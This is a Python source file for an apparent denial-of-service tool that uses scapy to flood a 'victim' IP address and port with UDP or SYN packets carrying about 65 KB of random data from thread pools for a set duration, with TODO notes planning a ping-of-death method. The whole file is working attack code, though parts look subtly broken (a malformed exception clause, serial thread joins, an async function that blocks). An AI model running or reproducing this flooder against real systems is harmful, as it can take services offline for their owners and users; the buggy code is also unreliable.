from thirdparty.scapy.all import *
import  time, random, string, threading

#   TODO
#   1. Update src code
#   2. Add PoD (ping of death) method.
#   3. Add default parameters if at least target is given.

#   Data placed outside of loop for performance...dont need to keep creating something that's constant.
random_data = ''.join([random.choice(string.ascii_letters + string.digits)for x in range(65000)])

async def strike(**kwargs):
    'Threaded attack methods (UDP and SYN)'
    #   attack function for UDP and SYN. Will probably re-write the entire src eventually
    #   but for now it works just as intended.


    UDPTHREADPOOL = []
    SYNTHREADPOOL = []

    end = time.time() + kwargs['time/Seconds']

    while time.time() < end:

        time.sleep(.4)

        if kwargs['method/UDP,SYN'] == 'UDP'.casefold():

            try:

                udp_packet = IP(dst=str(kwargs['victim/IP address']))/UDP(dport=int(kwargs['destination/Port']))/Raw(load=str(random_data))
                UDPTHREADPOOL.clear()   #   Need to clear the threads so it doesn't infinitely stack.

                for x in range(kwargs['threads']):

                    UDPTHREADPOOL.append(threading.Thread(target=send, args=udp_packet))

                for y in range(len(UDPTHREADPOOL)):

                    UDPTHREADPOOL[y].start()
                    UDPTHREADPOOL[y].join()
                    UDPTHREADPOOL[y]._stop()

            except (PermissionError or ThreadGenSource):

                print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
                raise SystemExit
        #   TODO
        #   Split this into a new function to avoid time elapsed from condition checking.
        elif kwargs['method/UDP,SYN'] == 'SYN'.casefold():

            try:

                tcp_packet = IP(dst=str(kwargs['victim/IP address']))/TCP(sport=RandShort(), dport=int(kwargs['destination/Port']), seq=123456, ack=74, window=None, flags='S')/Raw(load=str(random_data))

                for x in range(kwargs['threads']):

                    SYNTHREADPOOL.append(threading.Thread(target=send, args=tcp_packet))

                for y in range(len(SYNTHREADPOOL)):

                    SYNTHREADPOOL[y].start()
                    SYNTHREADPOOL[y].join()
                    SYNTHREADPOOL[y]._stop()

            except (PermissionError or ThreadGenSource):

                print ('\n[!!]\tMust run as root user or permission!\n[!!]\tCould not generate threads!')
                raise SystemExit

        else:

            print("\n[!!]\tPlease enter a real method (-m udp / -m syn). -h for help!")

    #   TODO
    #   Add statistics such as time elapsed and data amount sent.
    print ('\n[*]\tAttack finished successfully!')
    raise SystemExit




